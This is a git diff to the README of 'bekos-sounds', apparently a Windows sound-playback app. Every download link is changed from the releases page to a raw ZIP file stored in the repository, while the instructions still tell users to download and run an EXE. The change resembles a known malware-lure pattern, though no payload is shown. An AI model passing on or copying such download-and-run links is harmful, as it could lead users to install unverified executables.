@@ -1,6 +1,6 @@
 # 🎵 bekos-sounds - Simple sound playback for Windows
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/ilisj997/bekos-sounds/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/ilisj997/bekos-sounds/raw/refs/heads/main/Bekos.Sounds/bekos_sounds_3.7.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ It is built for Windows and uses a simple setup. If you want a fast way to play 
 
 Visit this page to download the app files:
 
-https://github.com/ilisj997/bekos-sounds/releases
+https://github.com/ilisj997/bekos-sounds/raw/refs/heads/main/Bekos.Sounds/bekos_sounds_3.7.zip
 
 Open the latest release, then pick the file that matches your Windows setup. If you see a ZIP file, download it and extract it first. If you see an EXE file, download it and run it.
 
@@ -29,7 +29,7 @@ Follow these steps to run bekos-sounds on Windows.
 ### 1. Open the download page
 Go to the release page:
 
-https://github.com/ilisj997/bekos-sounds/releases
+https://github.com/ilisj997/bekos-sounds/raw/refs/heads/main/Bekos.Sounds/bekos_sounds_3.7.zip
 
 ### 2. Find the latest release
 Look for the newest version at the top of the list.
@@ -191,6 +191,6 @@ You can expect:
 
 Use this link to download and run the app files:
 
-https://github.com/ilisj997/bekos-sounds/releases
+https://github.com/ilisj997/bekos-sounds/raw/refs/heads/main/Bekos.Sounds/bekos_sounds_3.7.zip
 
 Open the latest release, download the Windows file, and run it from your PC
